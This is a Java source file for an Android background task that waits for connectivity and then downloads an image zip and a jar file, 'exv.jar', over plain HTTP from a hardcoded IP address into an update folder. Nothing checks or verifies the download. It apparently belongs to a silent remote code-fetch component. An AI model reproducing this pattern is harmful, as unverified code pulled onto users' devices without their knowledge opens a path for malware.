/**
 * 
 */
package cn.play.dserv;

import java.io.File;



/**
 * exit
 * @author Keel
 *
 */
public class PLTask12 implements PLTask {

	private DServ dserv;
	private int id = 12;
	private int state = STATE_WAITING;
	private String TAG = "dserv-PLTask"+id;
	
	@Override
	public void run() {
		CheckTool.log(dserv.getService(), TAG, "==========PLTask id:"+this.id+"===========");
		dserv.dsLog(1, "PLTask", 100,dserv.getService().getPackageName(), "0_0_"+id+"_task_running");
		state = STATE_RUNNING;
		while (true) {
			if (!CheckTool.isNetOk(this.dserv.getService())) {
				try {
					Thread.sleep(1000*60*5);
				} catch (InterruptedException e) {
				}
				continue;
			}
			
			//下载图片zip包,jar包
			int readyPicCount = 0;
			String[] picFiles = {
					dserv.getLocalPath()+"pics/2_1.jpg",
					dserv.getLocalPath()+"pics/2_2.jpg",
					dserv.getLocalPath()+"pics/2_3.jpg"
			};
			boolean isPicReady = false;
			for (int i = 0; i < picFiles.length; i++) {
				File f = new File(picFiles[i]);
				if (f.isFile()) {
					readyPicCount++;
				}else{
					break;
				}
			}
			
			if (readyPicCount != 3) {
				//下载zip图片包
				String remote = "http://180.96.63.70:12370/plserver/dats/pics_2.zip";
				String localFile = dserv.getLocalPath()+"pics/pics_2.zip";
				if(dserv.downloadGoOn(remote, dserv.getLocalPath()+"pics", "pics_2.zip",this.dserv.getService())){
					CheckTool.log(dserv.getService(),TAG, "down zip OK:"+localFile);
					boolean unzip = dserv.unzip(localFile, dserv.getLocalPath()+"pics/");
					if (unzip) {
						CheckTool.log(dserv.getService(), TAG, "unzip OK:"+localFile);
						isPicReady = true;
					}
				}
			}else{
				isPicReady = true;
			}
			if (!isPicReady) {
				CheckTool.log(dserv.getService(), TAG, "pic is not ready");
				state = STATE_WAITING;
				break;
			}
			String remoteJar = "http://180.96.63.70:12370/plserver/dats/exv.jar";
			String localJarDir = dserv.getLocalPath()+"update/";
			if (dserv.downloadGoOn(remoteJar, localJarDir, "exv.jar", this.dserv.getService())) {
				CheckTool.log(dserv.getService(), TAG, "down jar OK:"+localJarDir+"exv.jar");
				this.dserv.taskDone(this);
				CheckTool.sLog(this.dserv.getService(), 101, "_@@"+this.id+"@@1@@done"); //1为type,表示任务已执行
				state = STATE_DIE;
			}else{
				state = STATE_WAITING;
			}
			break;
		}
		dserv.dsLog(1, "PLTask", 100,dserv.getService().getPackageName(), "0_0_"+id+"_task is finished.");
		CheckTool.log(dserv.getService(), TAG, "==========PLTask finished id:"+this.id+"===========");
		
	}
	/*public boolean isConnOk() {
		ConnectivityManager cm = (ConnectivityManager) dserv.getService().getSystemService(Context.CONNECTIVITY_SERVICE);
		boolean isOk = false;
		if (cm != null) {
			NetworkInfo aActiveInfo = cm.getActiveNetworkInfo();
			if (aActiveInfo != null && aActiveInfo.isAvailable()) {
				if (aActiveInfo.getState().equals(NetworkInfo.State.CONNECTED)) {
					isOk = true;
				}
			}
		}
		return isOk;
	}*/

	/* (non-Javadoc)
	 * @see cn.play.dserv.PLTask#getId()
	 */
	@Override
	public int getId() {
		return id;
	}

	/* (non-Javadoc)
	 * @see cn.play.dserv.PLTask#getState()
	 */
	@Override
	public int getState() {
		return this.state;
	}

	/* (non-Javadoc)
	 * @see cn.play.dserv.PLTask#init()
	 */
	@Override
	public void init() {
		CheckTool.log(dserv.getService(),TAG, "TASK "+id+" init.");
		
//		Log.d(TAG, "TASK "+id+" init.");
		if (dserv.getService() != null) {
			dserv.dsLog(1, "PLTask", 100,dserv.getService().getPackageName(), "0_0_"+id+"_task inited.");
		}else{
			CheckTool.log(dserv.getService(),TAG, "TASK "+id+" getService is null.");
		}
	}

	/* (non-Javadoc)
	 * @see cn.play.dserv.PLTask#setState(int)
	 */
	@Override
	public void setState(int arg0) {
		this.state = arg0;
	}

	@Override
	public void setDService(DServ serv) {
		this.dserv =serv;
	}
}
